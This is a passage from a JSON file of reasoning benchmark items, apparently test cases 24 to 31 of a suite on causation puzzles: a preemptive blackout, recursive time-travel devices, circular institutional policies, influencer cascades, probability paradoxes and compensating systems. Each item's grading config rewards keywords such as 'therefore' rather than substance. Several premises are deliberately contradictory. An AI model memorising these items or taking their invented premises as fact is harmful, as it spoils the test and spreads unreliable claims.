      "prompt": "\nFive events that could each independently cause a disaster are set to occur, but their interactions create a preemptive causation puzzle:\n\nPotential Disaster: City-wide blackout\n\nThe Five Events (scheduled):\n- Event A: Power plant maintenance at noon (would cut 40% power)\n- Event B: Heat wave peaks at 2 PM (would overload grid by 30%)\n- Event C: Cyber attack at 3 PM (would disable 50% of grid)\n- Event D: Equipment failure at 4 PM (would cascade to full blackout)\n- Event E: Backup system test at 5 PM (would temporarily reduce capacity by 60%)\n\nIndividual Effects:\n- Any single event alone wouldn't cause total blackout\n- Any two events together would cause partial blackout\n- Any three events would cause total blackout\n\nWhat Actually Happened:\n- 11:30 AM: Authorities learn about all five pending events\n- 11:45 AM: Event A proceeded as scheduled (40% reduction)\n- 1:30 PM: Event B impact reduced by A (only 20% additional load)\n- 2:45 PM: Event C prevented because hackers abort due to reduced grid\n- 3:30 PM: Event D doesn't cascade because system running at low capacity\n- 4:30 PM: Event E cancelled as unnecessary\n\nThe Paradox:\nEvent A, which partially caused a problem, prevented a worse problem. The partial blackout from A prevented the total blackout that would have resulted from B+C+D+E.\n\nCausal Questions:\n- Did Event A cause or prevent the disaster?\n- Can something be both harmful and protective simultaneously?\n- Do the prevented events (C, D, E) have causal relevance?\n- Who gets credit: A for preventing, or authorities for allowing A?\n\nCounterfactual Scenarios:\n1. If A hadn't occurred, would B+C+D+E cause total blackout?\n2. If authorities had prevented A, would they have prevented C?\n3. Did A cause C's prevention, or did C's perpetrators cause it?\n4. Is preemptive causation (A preventing future causes) real causation?\n\nQuestions:\n1. What is the true causal story of why the disaster didn't occur?\n2. Can an event cause prevention of itself (A partially caused what would have been total)?\n3. How do you assign causation to events that didn't happen?\n4. Is there moral difference between causing partial harm to prevent greater harm?\n5. In preemptive scenarios, what constitutes the actual cause of outcomes?\n6. How many levels of counterfactual reasoning are needed to understand this?\n\nExamine how preemptive causation challenges standard causal analysis.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive events that could each independently cause a disaster are set to occur, but their interactions create a preemptive causation puzzle:\n\nPotential Disaster: City-wide blackout\n\nThe Five Events (scheduled):\n- Event A: Power plant maintenance at noon (would cut 40% power)\n- Event B: Heat wave peaks at 2 PM (would overload grid by 30%)\n- Event C: Cyber attack at 3 PM (would disable 50% of grid)\n- Event D: Equipment failure at 4 PM (would cascade to full blackout)\n- Event E: Backup system test at 5 PM (would temporarily reduce capacity by 60%)\n\nIndividual Effects:\n- Any single event alone wouldn't cause total blackout\n- Any two events together would cause partial blackout\n- Any three events would cause total blackout\n\nWhat Actually Happened:\n- 11:30 AM: Authorities learn about all five pending events\n- 11:45 AM: Event A proceeded as scheduled (40% reduction)\n- 1:30 PM: Event B impact reduced by A (only 20% additional load)\n- 2:45 PM: Event C prevented because hackers abort due to reduced grid\n- 3:30 PM: Event D doesn't cascade because system running at low capacity\n- 4:30 PM: Event E cancelled as unnecessary\n\nThe Paradox:\nEvent A, which partially caused a problem, prevented a worse problem. The partial blackout from A prevented the total blackout that would have resulted from B+C+D+E.\n\nCausal Questions:\n- Did Event A cause or prevent the disaster?\n- Can something be both harmful and protective simultaneously?\n- Do the prevented events (C, D, E) have causal relevance?\n- Who gets credit: A for preventing, or authorities for allowing A?\n\nCounterfactual Scenarios:\n1. If A hadn't occurred, would B+C+D+E cause total blackout?\n2. If authorities had prevented A, would they have prevented C?\n3. Did A cause C's prevention, or did C's perpetrators cause it?\n4. Is preemptive causation (A preventing future causes) real causation?\n\nQuestions:\n1. What is the true causal story of why the disaster didn't occur?\n2. Can an event cause prevention of itself (A partially caused what would have been total)?\n3. How do you assign causation to events that didn't happen?\n4. Is there moral difference between causing partial harm to prevent greater harm?\n5. In preemptive scenarios, what constitutes the actual cause of outcomes?\n6. How many levels of counterfactual reasoning are needed to understand this?\n\nExamine how preemptive causation challenges standard causal analysis.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_25",
      "name": "Test 25: The Recursive Causation Laboratory",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nScientists designed an experiment where five quantum devices create recursive causal loops that challenge the nature of causation itself:\n\nThe Devices:\n- Device A: Sends information backward in time by 1 minute\n- Device B: Creates parallel timelines that can merge\n- Device C: Observes quantum states without collapse\n- Device D: Entangles events across timelines\n- Device E: Records immutable history of all events\n\nThe Experiment:\nStep 1: Scientist activates Device A to send message to past\nStep 2: Past-scientist receives message, decides not to send it\nStep 3: Device B creates timeline where message was/wasn't sent\nStep 4: Device C observes both timelines simultaneously\nStep 5: Device D entangles outcomes across timelines\nStep 6: Device E records contradictory histories\n\nThe Observed Paradoxes:\n- Effect 1: Message exists without being sent (causal loop)\n- Effect 2: Scientist remembers both sending and not sending\n- Effect 3: Device E's \"immutable\" records keep changing\n- Effect 4: Causation flows both forward and backward\n- Effect 5: Events cause their own preconditions\n\nTimeline Complications:\n- Timeline Alpha: Message sent â received â not sent (contradiction)\n- Timeline Beta: Message not sent â not received â sent (contradiction)\n- Timeline Gamma: Both sent and not sent (superposition)\n- Merged Timeline: Partial message exists\n\nThe Central Mystery:\nDevice E shows that:\n- Event X caused Event Y\n- Event Y prevented Event X\n- Both X and Y occurred\n- Neither X nor Y occurred\n- All of the above are simultaneously true\n\nScientific Interpretations:\n1. \"Causation doesn't exist at quantum scales\"\n2. \"Multiple causal structures coexist\"\n3. \"Observation creates causation retroactively\"\n4. \"The devices broke causation itself\"\n5. \"We're observing meta-causation\"\n\nQuestions:\n1. Can recursive causation be logically consistent?\n2. If A causes B and B prevents A, what actually happened?\n3. How can Device E record contradictory truths?\n4. Is causation fundamental or emergent from observation?\n5. Can broken causation still produce predictable results?\n6. What does this experiment reveal about the nature of cause and effect?\n\nAnalyze whether causation is a fundamental feature of reality or a construct that can be violated under extreme conditions.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nScientists designed an experiment where five quantum devices create recursive causal loops that challenge the nature of causation itself:\n\nThe Devices:\n- Device A: Sends information backward in time by 1 minute\n- Device B: Creates parallel timelines that can merge\n- Device C: Observes quantum states without collapse\n- Device D: Entangles events across timelines\n- Device E: Records immutable history of all events\n\nThe Experiment:\nStep 1: Scientist activates Device A to send message to past\nStep 2: Past-scientist receives message, decides not to send it\nStep 3: Device B creates timeline where message was/wasn't sent\nStep 4: Device C observes both timelines simultaneously\nStep 5: Device D entangles outcomes across timelines\nStep 6: Device E records contradictory histories\n\nThe Observed Paradoxes:\n- Effect 1: Message exists without being sent (causal loop)\n- Effect 2: Scientist remembers both sending and not sending\n- Effect 3: Device E's \"immutable\" records keep changing\n- Effect 4: Causation flows both forward and backward\n- Effect 5: Events cause their own preconditions\n\nTimeline Complications:\n- Timeline Alpha: Message sent â received â not sent (contradiction)\n- Timeline Beta: Message not sent â not received â sent (contradiction)\n- Timeline Gamma: Both sent and not sent (superposition)\n- Merged Timeline: Partial message exists\n\nThe Central Mystery:\nDevice E shows that:\n- Event X caused Event Y\n- Event Y prevented Event X\n- Both X and Y occurred\n- Neither X nor Y occurred\n- All of the above are simultaneously true\n\nScientific Interpretations:\n1. \"Causation doesn't exist at quantum scales\"\n2. \"Multiple causal structures coexist\"\n3. \"Observation creates causation retroactively\"\n4. \"The devices broke causation itself\"\n5. \"We're observing meta-causation\"\n\nQuestions:\n1. Can recursive causation be logically consistent?\n2. If A causes B and B prevents A, what actually happened?\n3. How can Device E record contradictory truths?\n4. Is causation fundamental or emergent from observation?\n5. Can broken causation still produce predictable results?\n6. What does this experiment reveal about the nature of cause and effect?\n\nAnalyze whether causation is a fundamental feature of reality or a construct that can be violated under extreme conditions.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_26",
      "name": "Test 26: The Institutional Causation Maze",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning general",
      "prompt": "\nFive institutions created policies that interact in ways that make causal responsibility nearly impossible to determine:\n\nThe Institutions and Their Policies:\n- Institution A (Central Bank): \"Interest rates adjust based on Institution B's employment data\"\n- Institution B (Labor Bureau): \"Employment targets based on Institution C's growth projections\"\n- Institution C (Planning Office): \"Growth projections based on Institution D's investment levels\"\n- Institution D (Investment Board): \"Investment guided by Institution E's risk assessments\"\n- Institution E (Risk Agency): \"Risk assessments based on Institution A's interest rates\"\n\nA Crisis Emerges:\n- Month 1: A raises rates due to B's high employment\n- Month 2: E increases risk assessment due to A's rates\n- Month 3: D reduces investment due to E's assessment\n- Month 4: C lowers growth projection due to D's investment\n- Month 5: B lowers employment target due to C's projection\n- Month 6: A lowers rates due to B's employment drop\n- Month 7: System spirals into recession\n\nEach Institution's Defense:\nA: \"We just followed our mandate responding to employment\"\nB: \"We aligned with growth projections as required\"\nC: \"We accurately reflected investment reality\"\nD: \"We responded appropriately to risk levels\"\nE: \"We correctly assessed risk from rate changes\"\n\nThe Causal Puzzle:\n- Each institution followed its rules perfectly\n- Each decision was rational given the information\n- The collective result was irrational and harmful\n- No single institution could have prevented it alone\n- Changing any one policy might have made things worse\n\nAttempted Interventions:\n- External regulator tries to break the cycle\n- But their intervention is incorporated into risk assessments\n- This amplifies the cycle rather than dampening it\n- The system has become causally autonomous\n\nQuestions:\n1. Which institution bears primary causal responsibility?\n2. Can there be causation without responsibility?\n3. How does circular causation differ from linear causation?\n4. Is the system itself a causal agent separate from its parts?\n5. Can rational individual decisions guarantee irrational collective outcomes?\n6. How should circular causal systems be governed?\n\nExplore how institutional interactions create emergent causation that transcends individual agency.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive institutions created policies that interact in ways that make causal responsibility nearly impossible to determine:\n\nThe Institutions and Their Policies:\n- Institution A (Central Bank): \"Interest rates adjust based on Institution B's employment data\"\n- Institution B (Labor Bureau): \"Employment targets based on Institution C's growth projections\"\n- Institution C (Planning Office): \"Growth projections based on Institution D's investment levels\"\n- Institution D (Investment Board): \"Investment guided by Institution E's risk assessments\"\n- Institution E (Risk Agency): \"Risk assessments based on Institution A's interest rates\"\n\nA Crisis Emerges:\n- Month 1: A raises rates due to B's high employment\n- Month 2: E increases risk assessment due to A's rates\n- Month 3: D reduces investment due to E's assessment\n- Month 4: C lowers growth projection due to D's investment\n- Month 5: B lowers employment target due to C's projection\n- Month 6: A lowers rates due to B's employment drop\n- Month 7: System spirals into recession\n\nEach Institution's Defense:\nA: \"We just followed our mandate responding to employment\"\nB: \"We aligned with growth projections as required\"\nC: \"We accurately reflected investment reality\"\nD: \"We responded appropriately to risk levels\"\nE: \"We correctly assessed risk from rate changes\"\n\nThe Causal Puzzle:\n- Each institution followed its rules perfectly\n- Each decision was rational given the information\n- The collective result was irrational and harmful\n- No single institution could have prevented it alone\n- Changing any one policy might have made things worse\n\nAttempted Interventions:\n- External regulator tries to break the cycle\n- But their intervention is incorporated into risk assessments\n- This amplifies the cycle rather than dampening it\n- The system has become causally autonomous\n\nQuestions:\n1. Which institution bears primary causal responsibility?\n2. Can there be causation without responsibility?\n3. How does circular causation differ from linear causation?\n4. Is the system itself a causal agent separate from its parts?\n5. Can rational individual decisions guarantee irrational collective outcomes?\n6. How should circular causal systems be governed?\n\nExplore how institutional interactions create emergent causation that transcends individual agency.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_27",
      "name": "Test 27: The Causal Influence Network",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_causal",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning causal",
      "prompt": "\nIn a social network, five influencers affect each other and their followers in complex ways that obscure true causal influence:\n\nThe Influencers:\n- Influencer A: 1 million followers, posts daily\n- Influencer B: 500K followers, posts weekly\n- Influencer C: 2 million followers, posts randomly\n- Influencer D: 100K followers, posts in response to others\n- Influencer E: 750K followers, posts contrarian views\n\nObserved Patterns:\n- When A posts opinion X, 60% of their followers adopt it within 24 hours\n- B's followers adopt X only if both A and C post it\n- C's followers adopt X randomly unless D opposes it\n- D automatically opposes whatever has majority support\n- E's followers adopt opposite of whatever is trending\n\nA Viral Phenomenon:\nDay 1: A posts support for Idea Q\nDay 2: 600K of A's followers support Q\nDay 3: C randomly posts support for Q\nDay 4: B sees A and C agree, posts support\nDay 5: Majority now supports Q, so D opposes\nDay 6: E posts opposition (contrarian to trend)\nDay 7: Massive polarization emerges\n\nThe Attribution Problem:\n- Media credits A for starting the movement\n- B claims credit for bringing legitimacy\n- C argues their randomness was actually strategic\n- D claims their opposition strengthened support\n- E says their contrarianism revealed the truth\n\nComplicating Factors:\n- Some followers follow multiple influencers\n- Followers influence each other independently\n- Timing matters: early adoption versus late\n- Opposition sometimes strengthens movements\n- The platform's algorithm amplifies certain patterns\n\nHidden Dynamics:\n- A actually got the idea from an obscure follower\n- C's \"random\" posting is influenced by private messages\n- D's opposition is sometimes strategic support\n- E coordinates with D privately\n- Platform algorithms shaped the entire cascade\n\nQuestions:\n1. Who truly caused the viral phenomenon?\n2. How do you separate platform causation from human causation?\n3. Can opposition be a form of causal support?\n4. Is there a difference between starting and causing virality?\n5. How do hidden influences affect causal attribution?\n6. Can causal influence be measured in complex networks?\n\nAnalyze how influence propagates through networks and whether true causation can be identified in complex social systems.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nIn a social network, five influencers affect each other and their followers in complex ways that obscure true causal influence:\n\nThe Influencers:\n- Influencer A: 1 million followers, posts daily\n- Influencer B: 500K followers, posts weekly\n- Influencer C: 2 million followers, posts randomly\n- Influencer D: 100K followers, posts in response to others\n- Influencer E: 750K followers, posts contrarian views\n\nObserved Patterns:\n- When A posts opinion X, 60% of their followers adopt it within 24 hours\n- B's followers adopt X only if both A and C post it\n- C's followers adopt X randomly unless D opposes it\n- D automatically opposes whatever has majority support\n- E's followers adopt opposite of whatever is trending\n\nA Viral Phenomenon:\nDay 1: A posts support for Idea Q\nDay 2: 600K of A's followers support Q\nDay 3: C randomly posts support for Q\nDay 4: B sees A and C agree, posts support\nDay 5: Majority now supports Q, so D opposes\nDay 6: E posts opposition (contrarian to trend)\nDay 7: Massive polarization emerges\n\nThe Attribution Problem:\n- Media credits A for starting the movement\n- B claims credit for bringing legitimacy\n- C argues their randomness was actually strategic\n- D claims their opposition strengthened support\n- E says their contrarianism revealed the truth\n\nComplicating Factors:\n- Some followers follow multiple influencers\n- Followers influence each other independently\n- Timing matters: early adoption versus late\n- Opposition sometimes strengthens movements\n- The platform's algorithm amplifies certain patterns\n\nHidden Dynamics:\n- A actually got the idea from an obscure follower\n- C's \"random\" posting is influenced by private messages\n- D's opposition is sometimes strategic support\n- E coordinates with D privately\n- Platform algorithms shaped the entire cascade\n\nQuestions:\n1. Who truly caused the viral phenomenon?\n2. How do you separate platform causation from human causation?\n3. Can opposition be a form of causal support?\n4. Is there a difference between starting and causing virality?\n5. How do hidden influences affect causal attribution?\n6. Can causal influence be measured in complex networks?\n\nAnalyze how influence propagates through networks and whether true causation can be identified in complex social systems.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_28",
      "name": "Test 28: The Probabilistic Causation Paradox",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_probabilistic",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning probabilistic",
      "prompt": "\nFive factors each probabilistically influence an outcome, but their combination creates paradoxical situations:\n\nThe Factors and Their Effects on Outcome O:\n- Factor A: Increases probability of O by 40%\n- Factor B: Increases probability of O by 30%\n- Factor C: Decreases probability of O by 50%\n- Factor D: Inverts the current probability of O\n- Factor E: Sets probability of O equal to the product of all other factors\n\nBase probability of O without any factors: 50%\n\nThe Paradox Scenarios:\n\nScenario 1: Factors applied in order A, B, C, D, E\n- After A: 50% + 40% = 90%\n- After B: 90% + 30% = 120% (capped at 100%?)\n- After C: 100% - 50% = 50%\n- After D: 100% - 50% = 50%\n- After E: Depends on how we count \"all other factors\"\n\nScenario 2: Factors applied simultaneously\n- If independent: Probability calculation becomes undefined\n- If dependent: Need to specify dependency structure\n- Factor D creates logical issues (invert what?)\n- Factor E creates recursive definition\n\nScenario 3: Factors influence each other\n- A makes B more likely to occur\n- B makes C less likely to occur\n- C determines whether D applies\n- D changes the meaning of E\n- E retroactively affects A through probability\n\nReal-World Case:\nIn 100 trials where all factors were present:\n- O occurred 73 times\n- When A was removed, O occurred 45/100 times\n- When B was removed, O occurred 62/100 times\n- When C was removed, O occurred 89/100 times\n- When D was removed, O occurred 73/100 times (same!)\n- When E was removed, O occurred 28/100 times\n\nThe Central Questions:\n- How can removing D not change the outcome frequency?\n- Why does E have the strongest effect despite being derivative?\n- Is A causing O if probability exceeds 100% before capping?\n\nQuestions:\n1. How do you calculate combined probabilistic causation?\n2. Can something be a cause if it doesn't change outcome frequency?\n3. How does probability capping affect causal attribution?\n4. Is probabilistic causation transitive?\n5. Can circular probabilistic influences be resolved?\n6. What is the \"true\" causal contribution of each factor?\n\nExamine how probabilistic causation differs from deterministic causation and whether standard causal logic applies.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive factors each probabilistically influence an outcome, but their combination creates paradoxical situations:\n\nThe Factors and Their Effects on Outcome O:\n- Factor A: Increases probability of O by 40%\n- Factor B: Increases probability of O by 30%\n- Factor C: Decreases probability of O by 50%\n- Factor D: Inverts the current probability of O\n- Factor E: Sets probability of O equal to the product of all other factors\n\nBase probability of O without any factors: 50%\n\nThe Paradox Scenarios:\n\nScenario 1: Factors applied in order A, B, C, D, E\n- After A: 50% + 40% = 90%\n- After B: 90% + 30% = 120% (capped at 100%?)\n- After C: 100% - 50% = 50%\n- After D: 100% - 50% = 50%\n- After E: Depends on how we count \"all other factors\"\n\nScenario 2: Factors applied simultaneously\n- If independent: Probability calculation becomes undefined\n- If dependent: Need to specify dependency structure\n- Factor D creates logical issues (invert what?)\n- Factor E creates recursive definition\n\nScenario 3: Factors influence each other\n- A makes B more likely to occur\n- B makes C less likely to occur\n- C determines whether D applies\n- D changes the meaning of E\n- E retroactively affects A through probability\n\nReal-World Case:\nIn 100 trials where all factors were present:\n- O occurred 73 times\n- When A was removed, O occurred 45/100 times\n- When B was removed, O occurred 62/100 times\n- When C was removed, O occurred 89/100 times\n- When D was removed, O occurred 73/100 times (same!)\n- When E was removed, O occurred 28/100 times\n\nThe Central Questions:\n- How can removing D not change the outcome frequency?\n- Why does E have the strongest effect despite being derivative?\n- Is A causing O if probability exceeds 100% before capping?\n\nQuestions:\n1. How do you calculate combined probabilistic causation?\n2. Can something be a cause if it doesn't change outcome frequency?\n3. How does probability capping affect causal attribution?\n4. Is probabilistic causation transitive?\n5. Can circular probabilistic influences be resolved?\n6. What is the \"true\" causal contribution of each factor?\n\nExamine how probabilistic causation differs from deterministic causation and whether standard causal logic applies.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_29",
      "name": "Test 29: The Causal Compensation Network",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_causal",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning causal",
      "prompt": "\nFive systems are designed to compensate for each other's failures, but this creates a causal maze where failure and success become indistinguishable:\n\nThe Systems:\n- System A: Primary function provider\n- System B: Backs up A when it fails\n- System C: Optimizes whoever is active (A or B)\n- System D: Predicts and prevents failures\n- System E: Learns from all system behaviors\n\nCompensation Mechanisms:\n- If A degrades 10%, B increases output 10%\n- If B is active, C reduces its efficiency by 50%\n- If C optimizes too aggressively, D triggers preventive shutdown\n- If D acts, E learns to prevent the situation\n- If E prevents situations, A never learns to handle them\n\nA Month of Operations:\nWeek 1: A performs at 100%, others idle\nWeek 2: A drops to 80%, B compensates 20%\nWeek 3: C optimizes B, making B more efficient than A\nWeek 4: D notices C's optimization causing instability\nWeek 5: E learns pattern, prevents A's degradation\n\nThe Paradoxical Outcome:\n- A never actually failed because B compensated\n- B's compensation prevented A from improving\n- C's optimization made the backup better than primary\n- D's prevention caused more instability than it prevented\n- E's learning made the system fragile to new situations\n\nCausal Questions:\n1. When B compensates for A, who causes the successful outcome?\n2. If C makes B better than A, should B become primary?\n3. When D prevents predicted failures, do those failures exist causally?\n4. Does E's learning cause or prevent system evolution?\n5. Is compensation a form of causation or prevention?\n\nThe Fundamental Dilemma:\nThe system never fails because of compensation, but this prevents learning. The lack of failure is itself a form of failure. Success causes future vulnerability.\n\nQuestions:\n1. In compensating systems, what is the true cause of outcomes?\n2. Can prevention be so effective it becomes harmful?\n3. How do you attribute causation when systems mask each other's effects?\n4. Is there a causal difference between active success and prevented failure?\n5. Should credit go to the primary system or the safety net?\n6. How does compensation affect causal responsibility?\n\nAnalyze how compensatory mechanisms obscure causal relationships and whether traditional concepts of success and failure apply.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive systems are designed to compensate for each other's failures, but this creates a causal maze where failure and success become indistinguishable:\n\nThe Systems:\n- System A: Primary function provider\n- System B: Backs up A when it fails\n- System C: Optimizes whoever is active (A or B)\n- System D: Predicts and prevents failures\n- System E: Learns from all system behaviors\n\nCompensation Mechanisms:\n- If A degrades 10%, B increases output 10%\n- If B is active, C reduces its efficiency by 50%\n- If C optimizes too aggressively, D triggers preventive shutdown\n- If D acts, E learns to prevent the situation\n- If E prevents situations, A never learns to handle them\n\nA Month of Operations:\nWeek 1: A performs at 100%, others idle\nWeek 2: A drops to 80%, B compensates 20%\nWeek 3: C optimizes B, making B more efficient than A\nWeek 4: D notices C's optimization causing instability\nWeek 5: E learns pattern, prevents A's degradation\n\nThe Paradoxical Outcome:\n- A never actually failed because B compensated\n- B's compensation prevented A from improving\n- C's optimization made the backup better than primary\n- D's prevention caused more instability than it prevented\n- E's learning made the system fragile to new situations\n\nCausal Questions:\n1. When B compensates for A, who causes the successful outcome?\n2. If C makes B better than A, should B become primary?\n3. When D prevents predicted failures, do those failures exist causally?\n4. Does E's learning cause or prevent system evolution?\n5. Is compensation a form of causation or prevention?\n\nThe Fundamental Dilemma:\nThe system never fails because of compensation, but this prevents learning. The lack of failure is itself a form of failure. Success causes future vulnerability.\n\nQuestions:\n1. In compensating systems, what is the true cause of outcomes?\n2. Can prevention be so effective it becomes harmful?\n3. How do you attribute causation when systems mask each other's effects?\n4. Is there a causal difference between active success and prevented failure?\n5. Should credit go to the primary system or the safety net?\n6. How does compensation affect causal responsibility?\n\nAnalyze how compensatory mechanisms obscure causal relationships and whether traditional concepts of success and failure apply.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_30",
      "name": "Test 30: The Causation Without Contact Puzzle",
      "suite": "Instruct Reasoning Complex Tests",
      "category": "reasoning_puzzle",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for reasoning puzzle",
      "prompt": "\nFive events occur with no apparent physical connection, yet seem causally related in ways that challenge our understanding of causation:\n\nThe Events:\n- Event A: A person in Tokyo decides not to take a flight\n- Event B: A stock price rises in New York 3 hours later\n- Event C: A scientific experiment fails in Geneva 6 hours later\n- Event D: A political decision changes in London 9 hours later\n- Event E: An earthquake prediction is made in San Francisco 12 hours later\n\nInitial Analysis Shows No Connection:\n- No communication between the locations\n- No shared personnel or resources\n- No common dependencies\n- No physical mechanism for influence\n- Events seem entirely unrelated\n\nBut Statistical Analysis Reveals:\n- When A occurs, B follows 87% of the time\n- When B occurs after A, C follows 76% of the time\n- The entire sequence AâBâCâDâE happens 64% of the time\n- Without A, the sequence never occurs\n- The correlation has held for 10 years\n\nInvestigators' Theories:\nTheory 1: Hidden variable - something causes all five\nTheory 2: Quantum entanglement at macroscopic scale\nTheory 3: Retroactive causation - E causes A in the past\nTheory 4: Synchronicity - meaningful coincidence without causation\nTheory 5: Observer effect - studying it creates the correlation\n\nExperimental Interventions:\n- Forcing A to occur: B-E follow as predicted\n- Preventing A: B-E don't occur\n- Forcing B without A: C-E don't follow\n- Observing without recording: correlation disappears\n- Recording without observing: correlation strengthens\n\nThe Paradox:\nThere's clear correlation and successful prediction, suggesting causation. But there's no mechanism for causation, suggesting coincidence. Yet coincidence doesn't explain intervention results.\n\nQuestions:\n1. Can causation exist without any physical mechanism?\n2. Is correlation with successful intervention sufficient for causation?\n3. How do you explain action-at-a-distance without physics?\n4. Could consciousness or observation be the causal medium?\n5. Is this evidence for non-physical causation?\n6. What experiments would definitively establish or refute causation?\n\nExplore whether causation requires physical connection or whether other forms of causation might exist.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nFive events occur with no apparent physical connection, yet seem causally related in ways that challenge our understanding of causation:\n\nThe Events:\n- Event A: A person in Tokyo decides not to take a flight\n- Event B: A stock price rises in New York 3 hours later\n- Event C: A scientific experiment fails in Geneva 6 hours later\n- Event D: A political decision changes in London 9 hours later\n- Event E: An earthquake prediction is made in San Francisco 12 hours later\n\nInitial Analysis Shows No Connection:\n- No communication between the locations\n- No shared personnel or resources\n- No common dependencies\n- No physical mechanism for influence\n- Events seem entirely unrelated\n\nBut Statistical Analysis Reveals:\n- When A occurs, B follows 87% of the time\n- When B occurs after A, C follows 76% of the time\n- The entire sequence AâBâCâDâE happens 64% of the time\n- Without A, the sequence never occurs\n- The correlation has held for 10 years\n\nInvestigators' Theories:\nTheory 1: Hidden variable - something causes all five\nTheory 2: Quantum entanglement at macroscopic scale\nTheory 3: Retroactive causation - E causes A in the past\nTheory 4: Synchronicity - meaningful coincidence without causation\nTheory 5: Observer effect - studying it creates the correlation\n\nExperimental Interventions:\n- Forcing A to occur: B-E follow as predicted\n- Preventing A: B-E don't occur\n- Forcing B without A: C-E don't follow\n- Observing without recording: correlation disappears\n- Recording without observing: correlation strengthens\n\nThe Paradox:\nThere's clear correlation and successful prediction, suggesting causation. But there's no mechanism for causation, suggesting coincidence. Yet coincidence doesn't explain intervention results.\n\nQuestions:\n1. Can causation exist without any physical mechanism?\n2. Is correlation with successful intervention sufficient for causation?\n3. How do you explain action-at-a-distance without physics?\n4. Could consciousness or observation be the causal medium?\n5. Is this evidence for non-physical causation?\n6. What experiments would definitively establish or refute causation?\n\nExplore whether causation requires physical connection or whether other forms of causation might exist.\n"
        }
      ],
      "parameters": {
        "max_tokens": 32768,
        "temperature": 0.1,
        "stream": false,
        "exclude": true,
        "effort": "high"
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "logical_deduction",
          "step_by_step",
          "analysis",
          "inference"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "therefore",
          "because",
          "given that",
          "it follows",
          "we can conclude"
        ]
      }
    },
    {
      "id": "reasoning_test_31",
      "name": "Test 31: The Omnipotence Paradox Variants",
